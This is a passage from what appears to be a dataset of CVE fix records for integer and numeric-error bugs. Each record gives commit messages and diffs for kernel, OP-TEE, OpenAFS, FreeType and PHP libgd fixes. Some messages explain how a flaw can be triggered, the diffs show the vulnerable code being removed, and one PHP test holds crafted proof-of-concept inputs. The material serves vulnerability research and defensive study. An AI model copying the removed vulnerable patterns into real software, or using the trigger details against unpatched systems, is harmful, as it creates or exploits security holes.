sbi->s_es->s_log_groups_per_flex;\n\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n\n\tif (groups_per_flex < 2) { ... }\n\nThis patch fixes two potential issues in the previous commit.\n\n1) The sanity check might only work on architectures like PowerPC.\nOn x86, 5 bits are used for the shifting amount.  That means, given a\nlarge s_log_groups_per_flex value like 36, groups_per_flex = 1 << 36\nis essentially 1 << 4 = 16, rather than 0.  This will bypass the check,\nleaving s_log_groups_per_flex and groups_per_flex inconsistent.\n\n2) The sanity check relies on undefined behavior, i.e., oversized shift.\nA standard-confirming C compiler could rewrite the check in unexpected\nways.  Consider the following equivalent form, assuming groups_per_flex\nis unsigned for simplicity.\n\n\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n\tif (groups_per_flex == 0 || groups_per_flex == 1) {\n\nWe compile the code snippet using Clang 3.0 and GCC 4.6.  Clang will\ncompletely optimize away the check groups_per_flex == 0, leaving the\npatched code as vulnerable as the original.  GCC keeps the check, but\nthere is no guarantee that future versions will do the same.\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>\nCc: stable@vger.kernel.org\n---\n fs\/ext4\/super.c | 7 +++----\n 1 file changed, 3 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/fs\/ext4\/super.c b\/fs\/ext4\/super.c\nindex 36570b7af7c5..108c3af8617b 100644\n--- a\/fs\/ext4\/super.c\n+++ b\/fs\/ext4\/super.c\n@@ -2006,17 +2006,16 @@ static int ext4_fill_flex_info(struct super_block *sb)\n \tstruct ext4_group_desc *gdp = NULL;\n \text4_group_t flex_group_count;\n \text4_group_t flex_group;\n-\tint groups_per_flex = 0;\n+\tunsigned int groups_per_flex = 0;\n \tsize_t size;\n \tint i;\n \n \tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;\n-\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n-\n-\tif (groups_per_flex < 2) {\n+\tif (sbi->s_log_groups_per_flex < 1 || sbi->s_log_groups_per_flex > 31) {\n \t\tsbi->s_log_groups_per_flex = 0;\n \t\treturn 1;\n \t}\n+\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n \n \t\/* We allocate both existing and potentially added groups *\/\n \tflex_group_count = ((sbi->s_groups_count + groups_per_flex - 1) +\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"stoth68000","repo":"media-tree","source":"cve"},{"CVE_ID":"CVE-2012-4433","CWE_ID":"189","category":"security","commit_id":"4757cdf73d3675478d645a3ec8250ba02168a230","commit_message":"From 4757cdf73d3675478d645a3ec8250ba02168a230 Mon Sep 17 00:00:00 2001\nFrom: Nils Philippsen <nils@redhat.com>\nDate: Tue, 16 Oct 2012 16:56:40 +0200\nSubject: [PATCH] ppm-load: CVE-2012-4433: add plausibility checks for header\n fields\n\nRefuse values that are non-decimal, negative or overflow the target\ntype.\n---\n operations\/external\/ppm-load.c | 33 ++++++++++++++++++++++++++++-----\n 1 file changed, 28 insertions(+), 5 deletions(-)\n\n","diff_code":"diff --git a\/operations\/external\/ppm-load.c b\/operations\/external\/ppm-load.c\nindex 3d6bce733..465096d67 100644\n--- a\/operations\/external\/ppm-load.c\n+++ b\/operations\/external\/ppm-load.c\n@@ -36,6 +36,7 @@ gegl_chant_file_path (path, _(\"File\"), \"\", _(\"Path of file to load.\"))\n #include \"gegl-chant.h\"\n #include <stdio.h>\n #include <stdlib.h>\n+#include <errno.h>\n \n typedef enum {\n   PIXMAP_ASCII  = 51,\n@@ -44,8 +45,8 @@ typedef enum {\n \n typedef struct {\n \tmap_type   type;\n-\tgint       width;\n-\tgint       height;\n+\tglong      width;\n+\tglong      height;\n         gsize      numsamples; \/* width * height * channels *\/\n         gsize      bpc;        \/* bytes per channel *\/\n \tguchar    *data;\n@@ -82,11 +83,33 @@ ppm_load_read_header(FILE       *fp,\n       }\n \n     \/* Get Width and Height *\/\n-    img->width  = strtol (header,&ptr,0);\n-    img->height = atoi (ptr);\n+    errno = 0;\n+    img->width  = strtol (header,&ptr,10);\n+    if (errno)\n+      {\n+        g_warning (\"Error reading width: %s\", strerror(errno));\n+        return FALSE;\n+      }\n+    else if (img->width < 0)\n+      {\n+        g_warning (\"Error: width is negative\");\n+        return FALSE;\n+      }\n+\n+    img->height = strtol (ptr,&ptr,10);\n+    if (errno)\n+      {\n+        g_warning (\"Error reading height: %s\", strerror(errno));\n+        return FALSE;\n+      }\n+    else if (img->width < 0)\n+      {\n+        g_warning (\"Error: height is negative\");\n+        return FALSE;\n+      }\n \n     fgets (header,MAX_CHARS_IN_ROW,fp);\n-    maxval = strtol (header,&ptr,0);\n+    maxval = strtol (header,&ptr,10);\n \n     if ((maxval != 255) && (maxval != 65535))\n       {\n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2019-1010294","CWE_ID":"189","category":"security","commit_id":"7e768f8a473409215fe3fff8f6e31f8a3a0103c6","commit_message":"From 7e768f8a473409215fe3fff8f6e31f8a3a0103c6 Mon Sep 17 00:00:00 2001\nFrom: Joakim Bech <joakim.bech@linaro.org>\nDate: Fri, 7 Sep 2018 09:46:25 +0200\nSubject: [PATCH] core: clear the entire TA area\n\nPreviously we cleared (memset to zero) the size corresponding to code\nand data segments, however the allocation for the TA is made on the\ngranularity of the memory pool, meaning that we did not clear all memory\nand because of that we could potentially leak code and data of a\nprevious loaded TA.\n\nFixes: OP-TEE-2018-0006: \"Potential disclosure of previously loaded TA\ncode and data\"\n\nSigned-off-by: Joakim Bech <joakim.bech@linaro.org>\nTested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8)\nSuggested-by: Jens Wiklander <jens.wiklander@linaro.org>\nReviewed-by: Jens Wiklander <jens.wiklander@linaro.org>\nReported-by: Riscure <inforequest@riscure.com>\nReported-by: Alyssa Milburn <a.a.milburn@vu.nl>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>\n---\n core\/arch\/arm\/kernel\/user_ta.c | 8 ++++++--\n 1 file changed, 6 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/core\/arch\/arm\/kernel\/user_ta.c b\/core\/arch\/arm\/kernel\/user_ta.c\nindex 808cffd439..e70061e368 100644\n--- a\/core\/arch\/arm\/kernel\/user_ta.c\n+++ b\/core\/arch\/arm\/kernel\/user_ta.c\n@@ -197,8 +197,12 @@ static struct mobj *alloc_ta_mem(size_t size)\n #else\n \tstruct mobj *mobj = mobj_mm_alloc(mobj_sec_ddr, size, &tee_mm_sec_ddr);\n \n-\tif (mobj)\n-\t\tmemset(mobj_get_va(mobj, 0), 0, size);\n+\tif (mobj) {\n+\t\tsize_t granularity = BIT(tee_mm_sec_ddr.shift);\n+\n+\t\t\/* Round up to allocation granularity size *\/\n+\t\tmemset(mobj_get_va(mobj, 0), 0, ROUNDUP(size, granularity));\n+\t}\n \treturn mobj;\n #endif\n }\n","owner":"OP-TEE","repo":"optee_os","source":"cve"},{"CVE_ID":"CVE-2015-8312","CWE_ID":"189","category":"security","commit_id":"2ef863720da4d9f368aaca0461c672a3008195ca","commit_message":"From 2ef863720da4d9f368aaca0461c672a3008195ca Mon Sep 17 00:00:00 2001\nFrom: Mark Vitale <mvitale@sinenomine.net>\nDate: Fri, 7 Aug 2015 11:56:16 -0400\nSubject: [PATCH] afs: pioctl kernel memory overrun\n\nCVE-2015-8312:\nAny pioctl with an input buffer size (ViceIoctl->in_size)\nexactly equal to AFS_LRALLOCSIZE (4096 bytes) will cause\na one-byte overwrite of its kernel memory working buffer.\nThis may crash the operating system or cause other\nundefined behavior.\n\nThe attacking pioctl must be a valid AFS pioctl code.\nHowever, it need not specify valid arguments (in the ViceIoctl),\nsince only rudimentary checking is done in afs_HandlePioctl.\nMost argument validation occurs later in the individual\npioctl handlers.\n\nNor does the issuer need to be authenticated or authorized\nin any way, since authorization checks also occur much later,\nin the individual pioctl handlers.  An unauthorized user\nmay therefore trigger the overrun by either crafting his\nown malicious pioctl, or by issuing a privileged\ncommand, e.g. 'fs newalias', with appropriately sized but\notherwise arbitrary arguments.  In the latter case, the\nattacker will see the expected error message:\n \"fs: You do not have the required rights to do this operation\"\nbut in either case the damage has been done.\n\nPioctls are not logged or audited in any way (except those\nthat cause loggable or auditable events as side effects).\n\nroot cause:\nafs_HandlePioctli() calls afs_pd_alloc() to allocate two\ntwo afs_pdata structs, one for input and one for output.\nThe memory for these buffers is based on the requested\nsize, plus at least one extra byte for the null terminator\nto be set later:\n  requested size\tallocated\n  =================\t=================================\n  > AFS_LRALLOCSIZ\tosi_Alloc(size+1)\n  <= AFS_LRALLOCSIZ\tafs_AllocLargeSize(AFS_LRALLOCSIZ)\n\nafs_HandlePioctl then adds a null terminator to each buffer,\none byte past the requested size.  This is safe in all cases\nexcept one: if the requested in_size was _exactly_\nAFS_LRALLOCSIZ (4096 bytes), this null is one byte beyond\nthe allocated storage, zeroing a byte of kernel memory.\n\nCommit 6260cbecd0795c4795341bdcf98671de6b9a43fb introduced\nthe null terminators and they were correct at that time.\nBut the commit message warns:\n \"note that this works because PIGGYSIZE is always less than\n  AFS_LRALLOCSIZ\"\n\nCommit f8ed1111d76bbf36a466036ff74b44e1425be8bd introduced\nthe bug by increasing the maximum size of the buffers but\nfailing to account correctly for the null terminator in\nthe case of input buffer size == AFS_LRALLOCSIZ.\n\nCommit 592a99d6e693bc640e2bdfc2e7e5243fcedc8f93 (master\nversion of one of the fixes in the recent 1.6.13 security\nrelease) is the fix that drew my attention to this new\nbug.  Ironically, 592a99 (combined with this commit), will\nmake it possible to eliminate the \"offending\" null termination\nline altogether since it will now be performed automatically by\nafs_pd_alloc().\n\n[kaduk@mit.edu: adjust commit message for CVE number assignment,\nreduce unneeded churn in the diff.]\n\nChange-Id: I0299274c6d879f95c9b40cc85859294c26c410d7\n---\n src\/afs\/afs_pioctl.c |   11 +++++++----\n 1 files changed, 7 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/src\/afs\/afs_pioctl.c b\/src\/afs\/afs_pioctl.c\nindex e91316a..0c96172 100644\n--- a\/src\/afs\/afs_pioctl.c\n+++ b\/src\/afs\/afs_pioctl.c\n@@ -53,8 +53,9 @@ struct afs_pdata {\n static_inline int\n afs_pd_alloc(struct afs_pdata *apd, size_t size)\n {\n-\n-    if (size > AFS_LRALLOCSIZ)\n+    \/* Ensure that we give caller at least one trailing guard byte\n+     * for the NUL terminator. *\/\n+    if (size >= AFS_LRALLOCSIZ)\n \tapd->ptr = osi_Alloc(size + 1);\n     else\n \tapd->ptr = osi_AllocLargeSpace(AFS_LRALLOCSIZ);\n@@ -62,11 +63,13 @@ afs_pd_alloc(struct afs_pdata *apd, size_t size)\n     if (apd->ptr == NULL)\n \treturn ENOMEM;\n \n-    if (size > AFS_LRALLOCSIZ)\n+    \/* Clear it all now, including the guard byte. *\/\n+    if (size >= AFS_LRALLOCSIZ)\n \tmemset(apd->ptr, 0, size + 1);\n     else\n \tmemset(apd->ptr, 0, AFS_LRALLOCSIZ);\n \n+    \/* Don't tell the caller about the guard byte. *\/\n     apd->remaining = size;\n \n     return 0;\n@@ -78,7 +81,7 @@ afs_pd_free(struct afs_pdata *apd)\n     if (apd->ptr == NULL)\n \treturn;\n \n-    if (apd->remaining > AFS_LRALLOCSIZ)\n+    if (apd->remaining >= AFS_LRALLOCSIZ)\n \tosi_Free(apd->ptr, apd->remaining + 1);\n     else\n \tosi_FreeLargeSpace(apd->ptr);\n-- \n1.7.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2012-2375","CWE_ID":"189","category":"security","commit_id":"20e0fa98b751facf9a1101edaefbc19c82616a68","commit_message":"From 20e0fa98b751facf9a1101edaefbc19c82616a68 Mon Sep 17 00:00:00 2001\nFrom: Sachin Prabhu <sprabhu@redhat.com>\nDate: Thu, 22 Mar 2012 16:46:28 +0000\nSubject: Fix length of buffer copied in __nfs4_get_acl_uncached\n\n_copy_from_pages() used to copy data from the temporary buffer to the\nuser passed buffer is passed the wrong size parameter when copying\ndata. res.acl_len contains both the bitmap and acl lenghts while\nacl_len contains the acl length after adjusting for the bitmap size.\n\nSigned-off-by: Sachin Prabhu <sprabhu@redhat.com>\nSigned-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>\n---\n fs\/nfs\/nfs4proc.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/fs\/nfs\/nfs4proc.c b\/fs\/nfs\/nfs4proc.c\nindex e809d2305ebf..45df7d4a3acc 100644\n--- a\/fs\/nfs\/nfs4proc.c\n+++ b\/fs\/nfs\/nfs4proc.c\n@@ -3712,7 +3712,7 @@ static ssize_t __nfs4_get_acl_uncached(struct inode *inode, void *buf, size_t bu\n \t\tif (acl_len > buflen)\n \t\t\tgoto out_free;\n \t\t_copy_from_pages(buf, pages, res.acl_data_offset,\n-\t\t\t\tres.acl_len);\n+\t\t\t\tacl_len);\n \t}\n \tret = acl_len;\n out_free:\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-1759","CWE_ID":"189","category":"security","commit_id":"0f22072ab50cac7983f9660d33974b45184da4f9","commit_message":"From 0f22072ab50cac7983f9660d33974b45184da4f9 Mon Sep 17 00:00:00 2001\nFrom: Dan Rosenberg <drosenberg@vsecurity.com>\nDate: Fri, 29 Apr 2011 15:48:07 +0100\nSubject: ARM: 6891\/1: prevent heap corruption in OABI semtimedop\n\nWhen CONFIG_OABI_COMPAT is set, the wrapper for semtimedop does not\nbound the nsops argument.  A sufficiently large value will cause an\ninteger overflow in allocation size, followed by copying too much data\ninto the allocated buffer.  Fix this by restricting nsops to SEMOPM.\nUntested.\n\nCc: stable@kernel.org\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nSigned-off-by: Russell King <rmk+kernel@arm.linux.org.uk>\n---\n arch\/arm\/kernel\/sys_oabi-compat.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/arch\/arm\/kernel\/sys_oabi-compat.c b\/arch\/arm\/kernel\/sys_oabi-compat.c\nindex 4ad8da15ef2b..af0aaebf4de6 100644\n--- a\/arch\/arm\/kernel\/sys_oabi-compat.c\n+++ b\/arch\/arm\/kernel\/sys_oabi-compat.c\n@@ -311,7 +311,7 @@ asmlinkage long sys_oabi_semtimedop(int semid,\n \tlong err;\n \tint i;\n \n-\tif (nsops < 1)\n+\tif (nsops < 1 || nsops > SEMOPM)\n \t\treturn -EINVAL;\n \tsops = kmalloc(sizeof(*sops) * nsops, GFP_KERNEL);\n \tif (!sops)\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"stoth68000","repo":"media-tree","source":"cve"},{"CVE_ID":"CVE-2010-3437","CWE_ID":"189","category":"security","commit_id":"252a52aa4fa22a668f019e55b3aac3ff71ec1c29","commit_message":"From 252a52aa4fa22a668f019e55b3aac3ff71ec1c29 Mon Sep 17 00:00:00 2001\nFrom: Dan Rosenberg <drosenberg@vsecurity.com>\nDate: Mon, 27 Sep 2010 12:30:28 -0400\nSubject: Fix pktcdvd ioctl dev_minor range check\n\nThe PKT_CTRL_CMD_STATUS device ioctl retrieves a pointer to a\npktcdvd_device from the global pkt_devs array.  The index into this\narray is provided directly by the user and is a signed integer, so the\ncomparison to ensure that it falls within the bounds of this array will\nfail when provided with a negative index.\n\nThis can be used to read arbitrary kernel memory or cause a crash due to\nan invalid pointer dereference.  This can be exploited by users with\npermission to open \/dev\/pktcdvd\/control (on many distributions, this is\nreadable by group \"cdrom\").\n\nSigned-off-by: Dan Rosenberg <dan.j.rosenberg@gmail.com>\n[ Rather than add a cast, just make the function take the right type -Linus ]\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n drivers\/block\/pktcdvd.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/drivers\/block\/pktcdvd.c b\/drivers\/block\/pktcdvd.c\nindex b1cbeb59bb76..37a2bb595076 100644\n--- a\/drivers\/block\/pktcdvd.c\n+++ b\/drivers\/block\/pktcdvd.c\n@@ -2369,7 +2369,7 @@ static void pkt_release_dev(struct pktcdvd_device *pd, int flush)\n \tpkt_shrink_pktlist(pd);\n }\n \n-static struct pktcdvd_device *pkt_find_dev_from_minor(int dev_minor)\n+static struct pktcdvd_device *pkt_find_dev_from_minor(unsigned int dev_minor)\n {\n \tif (dev_minor >= MAX_WRITERS)\n \t\treturn NULL;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-2596","CWE_ID":"189","category":"security","commit_id":"fc9bbca8f650e5f738af8806317c0a041a48ae4a","commit_message":"From fc9bbca8f650e5f738af8806317c0a041a48ae4a Mon Sep 17 00:00:00 2001\nFrom: Linus Torvalds <torvalds@linux-foundation.org>\nDate: Fri, 19 Apr 2013 09:57:35 -0700\nSubject: [PATCH] vm: convert fb_mmap to vm_iomap_memory() helper\n\nThis is my example conversion of a few existing mmap users.  The\nfb_mmap() case is a good example because it is a bit more complicated\nthan some: fb_mmap() mmaps one of two different memory areas depending\non the page offset of the mmap (but happily there is never any mixing of\nthe two, so the helper function still works).\n\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n drivers\/video\/fbmem.c | 39 ++++++++++++++-------------------------\n 1 file changed, 14 insertions(+), 25 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/video\/fbmem.c b\/drivers\/video\/fbmem.c\nindex 7c254084b6a04..86291dcd964a9 100644\n--- a\/drivers\/video\/fbmem.c\n+++ b\/drivers\/video\/fbmem.c\n@@ -1373,15 +1373,12 @@ fb_mmap(struct file *file, struct vm_area_struct * vma)\n {\n \tstruct fb_info *info = file_fb_info(file);\n \tstruct fb_ops *fb;\n-\tunsigned long off;\n+\tunsigned long mmio_pgoff;\n \tunsigned long start;\n \tu32 len;\n \n \tif (!info)\n \t\treturn -ENODEV;\n-\tif (vma->vm_pgoff > (~0UL >> PAGE_SHIFT))\n-\t\treturn -EINVAL;\n-\toff = vma->vm_pgoff << PAGE_SHIFT;\n \tfb = info->fbops;\n \tif (!fb)\n \t\treturn -ENODEV;\n@@ -1393,32 +1390,24 @@ fb_mmap(struct file *file, struct vm_area_struct * vma)\n \t\treturn res;\n \t}\n \n-\t\/* frame buffer memory *\/\n+\t\/*\n+\t * Ugh. This can be either the frame buffer mapping, or\n+\t * if pgoff points past it, the mmio mapping.\n+\t *\/\n \tstart = info->fix.smem_start;\n-\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + info->fix.smem_len);\n-\tif (off >= len) {\n-\t\t\/* memory mapped io *\/\n-\t\toff -= len;\n-\t\tif (info->var.accel_flags) {\n-\t\t\tmutex_unlock(&info->mm_lock);\n-\t\t\treturn -EINVAL;\n-\t\t}\n+\tlen = info->fix.smem_len;\n+\tmmio_pgoff = PAGE_ALIGN((start & ~PAGE_MASK) + len) >> PAGE_SHIFT;\n+\tif (vma->vm_pgoff >= mmio_pgoff) {\n+\t\tvma->vm_pgoff -= mmio_pgoff;\n \t\tstart = info->fix.mmio_start;\n-\t\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + info->fix.mmio_len);\n+\t\tlen = info->fix.mmio_len;\n \t}\n \tmutex_unlock(&info->mm_lock);\n-\tstart &= PAGE_MASK;\n-\tif ((vma->vm_end - vma->vm_start + off) > len)\n-\t\treturn -EINVAL;\n-\toff += start;\n-\tvma->vm_pgoff = off >> PAGE_SHIFT;\n-\t\/* VM_IO | VM_DONTEXPAND | VM_DONTDUMP are set by io_remap_pfn_range()*\/\n+\n \tvma->vm_page_prot = vm_get_page_prot(vma->vm_flags);\n-\tfb_pgprotect(file, vma, off);\n-\tif (io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,\n-\t\t\t     vma->vm_end - vma->vm_start, vma->vm_page_prot))\n-\t\treturn -EAGAIN;\n-\treturn 0;\n+\tfb_pgprotect(file, vma, start);\n+\n+\treturn vm_iomap_memory(vma, start, len);\n }\n \n static int\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-9670","CWE_ID":"189","category":"security","commit_id":"ef1eba75187adfac750f326b563fe543dd5ff4e6","commit_message":"From ef1eba75187adfac750f326b563fe543dd5ff4e6 Mon Sep 17 00:00:00 2001\nFrom: Werner Lemberg <wl@gnu.org>\nDate: Thu, 6 Nov 2014 23:25:05 +0100\nSubject: Fix Savannah bug #43548.\n\n* src\/pcf\/pcfread (pcf_get_encodings): Add sanity checks for row and\ncolumn values.\n---\n ChangeLog         | 7 +++++++\n src\/pcf\/pcfread.c | 9 +++++++++\n 2 files changed, 16 insertions(+)\n\n","diff_code":"diff --git a\/ChangeLog b\/ChangeLog\nindex 9b56e91..d709e41 100644\n--- a\/ChangeLog\n+++ b\/ChangeLog\n@@ -1,5 +1,12 @@\n 2014-11-06  Werner Lemberg  <wl@gnu.org>\n \n+\tFix Savannah bug #43548.\n+\n+\t* src\/pcf\/pcfread (pcf_get_encodings): Add sanity checks for row and\n+\tcolumn values.\n+\n+2014-11-06  Werner Lemberg  <wl@gnu.org>\n+\n \tFix Savannah bug #43547.\n \n \t* src\/pcf\/pcfread.c (pcf_read_TOC): Check `size' and `offset'\ndiff --git a\/src\/pcf\/pcfread.c b\/src\/pcf\/pcfread.c\nindex 8db31bd..668c962 100644\n--- a\/src\/pcf\/pcfread.c\n+++ b\/src\/pcf\/pcfread.c\n@@ -830,6 +830,15 @@ THE SOFTWARE.\n     if ( !PCF_FORMAT_MATCH( format, PCF_DEFAULT_FORMAT ) )\n       return FT_THROW( Invalid_File_Format );\n \n+    \/* sanity checks *\/\n+    if ( firstCol < 0       ||\n+         firstCol > lastCol ||\n+         lastCol  > 0xFF    ||\n+         firstRow < 0       ||\n+         firstRow > lastRow ||\n+         lastRow  > 0xFF    )\n+      return FT_THROW( Invalid_Table );\n+\n     FT_TRACE4(( \"pdf_get_encodings:\\n\" ));\n \n     FT_TRACE4(( \"  firstCol %d, lastCol %d, firstRow %d, lastRow %d\\n\",\n-- \ncgit v1.0-41-gc330\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-7328","CWE_ID":"189","category":"security","commit_id":"8f4a5373bb71590352fd934028d6dde5bc18530b","commit_message":"From 8f4a5373bb71590352fd934028d6dde5bc18530b Mon Sep 17 00:00:00 2001\nFrom: Remi Collet <remi@php.net>\nDate: Sat, 28 Dec 2013 14:22:13 +0100\nSubject: [PATCH] Fixed bug #66356 (Heap Overflow Vulnerability in imagecrop())\n\nInitial fix was PHP stuff\nThis one is libgd fix.\n\n- filter invalid crop size\n- dont try to copy on invalid position\n- fix crop size when out of src image\n- fix possible NULL deref\n- fix possible integer overfloow\n---\n NEWS                       |  3 ++-\n ext\/gd\/libgd\/gd_crop.c     | 52 ++++++++++++++++++++++++++++------------------\n ext\/gd\/tests\/bug66356.phpt | 22 ++++++++++++++++++--\n 3 files changed, 54 insertions(+), 23 deletions(-)\n\n","diff_code":"diff --git a\/NEWS b\/NEWS\nindex 86eeb7c..aed16cc 100644\n--- a\/NEWS\n+++ b\/NEWS\n@@ -29,7 +29,8 @@ PHP                                                                        NEWS\n   . Fixed bug #66229 (128.0.0.0\/16 isn't reserved any longer). (Adam)\n \n - GD:\n-  . Fixed bug #66356 (Heap Overflow Vulnerability in imagecrop()). (Laruence)\n+  . Fixed bug #66356 (Heap Overflow Vulnerability in imagecrop()).\n+    (Laruence, Remi)\n   . Fixed bug #64405 (Use freetype-config for determining freetype2 dir(s)).\n     (Adam)\n     \ndiff --git a\/ext\/gd\/libgd\/gd_crop.c b\/ext\/gd\/libgd\/gd_crop.c\nindex f0b888a..90a99a6 100644\n--- a\/ext\/gd\/libgd\/gd_crop.c\n+++ b\/ext\/gd\/libgd\/gd_crop.c\n@@ -44,6 +44,12 @@ gdImagePtr gdImageCrop(gdImagePtr src, const gdRectPtr crop)\n {\n \tgdImagePtr dst;\n \n+\t\/* check size *\/\n+\tif (crop->width<=0 || crop->height<=0) {\n+\t\treturn NULL;\n+\t}\n+\n+\t\/* allocate the requested size (could be only partially filled) *\/\n \tif (src->trueColor) {\n \t\tdst = gdImageCreateTrueColor(crop->width, crop->height);\n \t\tgdImageSaveAlpha(dst, 1);\n@@ -51,37 +57,43 @@ gdImagePtr gdImageCrop(gdImagePtr src, const gdRectPtr crop)\n \t\tdst = gdImageCreate(crop->width, crop->height);\n \t\tgdImagePaletteCopy(dst, src);\n \t}\n+\tif (dst == NULL) {\n+\t\treturn NULL;\n+\t}\n \tdst->transparent = src->transparent;\n \n-\tif (src->sx < (crop->x + crop->width -1)) {\n-\t\tcrop->width = src->sx - crop->x + 1;\n+\t\/* check position in the src image *\/\n+\tif (crop->x < 0 || crop->x>=src->sx || crop->y<0 || crop->y>=src->sy) {\n+\t\treturn dst;\n+\t}\n+\n+\t\/* reduce size if needed *\/\n+\tif ((src->sx - crop->width) < crop->x) {\n+\t\tcrop->width = src->sx - crop->x;\n \t}\n-\tif (src->sy < (crop->y + crop->height -1)) {\n-\t\tcrop->height = src->sy - crop->y + 1;\n+\tif ((src->sy - crop->height) < crop->y) {\n+\t\tcrop->height = src->sy - crop->y;\n \t}\n+\n #if 0\n printf(\"rect->x: %i\\nrect->y: %i\\nrect->width: %i\\nrect->height: %i\\n\", crop->x, crop->y, crop->width, crop->height);\n #endif\n-\tif (dst == NULL) {\n-\t\treturn NULL;\n+\tint y = crop->y;\n+\tif (src->trueColor) {\n+\t\tunsigned int dst_y = 0;\n+\t\twhile (y < (crop->y + (crop->height - 1))) {\n+\t\t\t\/* TODO: replace 4 w\/byte per channel||pitch once available *\/\n+\t\t\tmemcpy(dst->tpixels[dst_y++], src->tpixels[y++] + crop->x, crop->width * 4);\n+\t\t}\n \t} else {\n-\t\tint y = crop->y;\n-\t\tif (src->trueColor) {\n-\t\t\tunsigned int dst_y = 0;\n-\t\t\twhile (y < (crop->y + (crop->height - 1))) {\n-\t\t\t\t\/* TODO: replace 4 w\/byte per channel||pitch once available *\/\n-\t\t\t\tmemcpy(dst->tpixels[dst_y++], src->tpixels[y++] + crop->x, crop->width * 4);\n-\t\t\t}\n-\t\t} else {\n-\t\t\tint x;\n-\t\t\tfor (y = crop->y; y < (crop->y + (crop->height - 1)); y++) {\n-\t\t\t\tfor (x = crop->x; x < (crop->x + (crop->width - 1)); x++) {\n-\t\t\t\t\tdst->pixels[y - crop->y][x - crop->x] = src->pixels[y][x];\n-\t\t\t\t}\n+\t\tint x;\n+\t\tfor (y = crop->y; y < (crop->y + (crop->height - 1)); y++) {\n+\t\t\tfor (x = crop->x; x < (crop->x + (crop->width - 1)); x++) {\n+\t\t\t\tdst->pixels[y - crop->y][x - crop->x] = src->pixels[y][x];\n \t\t\t}\n \t\t}\n-\t\treturn dst;\n \t}\n+\treturn dst;\n }\n \n \/**\ndiff --git a\/ext\/gd\/tests\/bug66356.phpt b\/ext\/gd\/tests\/bug66356.phpt\nindex f881494..2da91d6 100644\n--- a\/ext\/gd\/tests\/bug66356.phpt\n+++ b\/ext\/gd\/tests\/bug66356.phpt\n@@ -7,12 +7,27 @@ Bug #66356 (Heap Overflow Vulnerability in imagecrop())\n --FILE--\n <?php\n $img = imagecreatetruecolor(10, 10);\n-$img = imagecrop($img, array(\"x\" => \"a\", \"y\" => 0, \"width\" => 10, \"height\" => 10));\n+\n+\/\/ POC #1\n+var_dump(imagecrop($img, array(\"x\" => \"a\", \"y\" => 0, \"width\" => 10, \"height\" => 10)));\n+\n $arr = array(\"x\" => \"a\", \"y\" => \"12b\", \"width\" => 10, \"height\" => 10);\n-$img = imagecrop($img, $arr);\n+var_dump(imagecrop($img, $arr));\n print_r($arr);\n+\n+\/\/ POC #2\n+var_dump(imagecrop($img, array(\"x\" => 0, \"y\" => 0, \"width\" => -1, \"height\" => 10)));\n+\n+\/\/ POC #3\n+var_dump(imagecrop($img, array(\"x\" => -20, \"y\" => -20, \"width\" => 10, \"height\" => 10)));\n+\n+\/\/ POC #4\n+var_dump(imagecrop($img, array(\"x\" => 0x7fffff00, \"y\" => 0, \"width\" => 10, \"height\" => 10)));\n+\n ?>\n --EXPECTF--\n+resource(%d) of type (gd)\n+resource(%d) of type (gd)\n Array\n (\n     [x] => a\n@@ -20,3 +35,6 @@ Array\n     [width] => 10\n     [height] => 10\n )\n+bool(false)\n+resource(%d) of type (gd)\n+resource(%d) of type (gd)\n\\ No newline at end of file\n-- \n2.1.4\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-1746","CWE_ID":"189","category":"security","commit_id":"b522f02184b413955f3bc952e3776ce41edc6355","commit_message":"From b522f02184b413955f3bc952e3776ce41edc6355 Mon Sep 17 00:00:00 2001\nFrom: Vasiliy Kulikov <segoon@openwall.com>\nDate: Thu, 14 Apr 2011 20:55:19 +0400\nSubject: agp: fix OOM and buffer overflow\n\npage_count is copied from userspace.  agp_allocate_memory() tries to\ncheck whether this number is too big, but doesn't take into account the\nwrap case.  Also agp_create_user_memory() doesn't check whether\nalloc_size is calculated from num_agp_pages variable without overflow.\nThis may lead to allocation of too small buffer with following buffer\noverflow.\n\nAnother problem in agp code is not addressed in the patch - kernel memory\nexhaustion (AGPIOC_RESERVE and AGPIOC_ALLOCATE ioctls).  It is not checked\nwhether requested pid is a pid of the caller (no check in agpioc_reserve_wrap()).\nEach allocation is limited to 16KB, though, there is no per-process limit.\nThis might lead to OOM situation, which is not even solved in case of the\ncaller death by OOM killer - the memory is allocated for another (faked) 